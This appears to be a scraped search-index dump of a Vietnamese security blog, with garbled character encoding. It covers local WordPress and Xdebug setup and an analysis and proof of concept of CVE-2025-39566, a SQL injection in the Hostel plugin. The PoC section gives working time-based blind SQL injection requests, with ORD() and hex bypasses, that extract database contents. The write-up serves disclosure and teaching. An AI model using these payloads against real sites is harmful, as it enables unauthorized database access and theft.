\u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() l√† m·ªôt Plugin API c·ªßa WordPress, cho ph√©p g·∫Øn m·ªôt callback v√†o m·ªôt action hook. Hook name ·ªü ƒë√¢y l√† admin_menu, nghƒ©a l√† h√†m WPHostel::menu() s·∫Ω ƒë∆∞·ª£c g·ªçi trong v√≤ng ƒë·ªùi khi WordPress d·ª±ng Admin Dashboard Menu. Menu tr√™n UI Admin Dashboard\nDebugging\nCh·ª©c nƒÉng b·ªã l·ªói n·∫±m trong Booking Manager, v√¨ v·∫≠y ta truy c·∫≠p v√†o submenu Manager Bookings tr√™n UI Admin Dashboard. Ngay tr∆∞·ªõc nh√°nh default c√≥ comment // list bookings =\u0026gt; cho th·∫•y ƒëo·∫°n code n√†y x·ª≠ l√Ω vi·ªác li·ªát k√™ v√† s·∫Øp x·∫øp bookings M·ªü debugger: Click Run with Debugger. ƒê·∫∑t breakpoint t·∫°i nh√°nh switch ch·ª©a code l·ªói v√† t·∫°i d√≤ng code g√¢y l·ªói. Khi click v√†o m·ªôt c·ªôt trong b·∫£ng bookings, quan s√°t: Debugger nh·∫£y v√†o c·∫•u tr√∫c switch. D√πng Step Over, debugger ƒëi ti·∫øp v√†o nh√°nh default. Ti·∫øp t·ª•c Step Over v√† theo d√µi gi√° tr·ªã bi·∫øn trong tab Variables \u0026gt; Locals. C√°c bi·∫øn n√†y s·∫Ω k·∫øt h·ª£p ƒë·ªÉ t·∫°o th√†nh c√¢u SQL b√™n d∆∞·ªõi. Sau khi gh√©p c√°c bi·∫øn, c√¢u query ƒë·∫ßy ƒë·ªß c√≥ d·∫°ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ƒê√°ng ch√∫ √Ω, bi·∫øn $orderby ƒë∆∞·ª£c g√°n nh∆∞ sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ‚ö†Ô∏è ·ªû ƒë√¢y c√≥ ƒëi·ªÉm b·∫•t th∆∞·ªùng:\nPh·∫ßn sau ORDER BY s·ª≠ d·ª•ng sanitize_text_field(). H√†m n√†y ch·ªâ l√†m s·∫°ch HTML, kh√¥ng h·ªÅ filter ho·∫∑c validate ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n trong SQL context. Tham s·ªë ob (do ng∆∞·ªùi d√πng truy·ªÅn v√†o) v√¨ v·∫≠y c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng ƒë·ªÉ ch√®n tr·ª±c ti·∫øp v√†o c√¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta t√°ch m·ªánh ƒë·ªÅ ORDER BY b·∫±ng , v√¨ n√≥ ch·∫•p nh·∫≠p multi column\nK·∫øt qu·∫£: th·ªùi gian ph·∫£n h·ªìi b·ªã delay =\u0026gt; SQL Injection th√†nh c√¥ng.\nDump Data from Database Bypass ' using ORD():\nƒê·ªÉ dump d·ªØ li·ªáu c·ªßa database ta c·∫ßn th·ª≠ ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name.\nDo sanitize_text_field() lo·∫°i b·ªè ', ta kh√¥ng d√πng ƒë∆∞·ª£c payload so s√°nh tr·ª±c ti·∫øp. Thay v√†o ƒë√≥ d√πng ORD() ƒë·ªÉ so s√°nh k√Ω t·ª± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nBypass ' using Hex encoding (extend)\nNgo√†i ORD() ta c√≥ th·ªÉ s·ª≠ d·ª•ng Hex encoding ƒë·ªÉ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Th√†nh c√¥ng bypass =\u0026gt; c√≥ th·ªÉ tr√≠ch xu·∫•t t√™n database.\nConclusion L·ªó h·ªïng CVE-2025-39566 trong plugin WordPress Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ 